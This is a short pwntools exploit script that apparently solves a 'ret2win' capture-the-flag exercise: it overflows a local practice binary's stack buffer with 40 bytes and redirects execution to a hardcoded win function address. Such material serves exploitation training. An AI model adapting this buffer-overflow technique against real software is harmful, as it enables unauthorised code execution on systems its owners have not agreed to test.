from pwn import *

context.bits = 64

p = process("./ret2win")

ret2win = 0x400756

payload = b"A"*40 + p64(ret2win)

p.send(payload)

p.interactive()
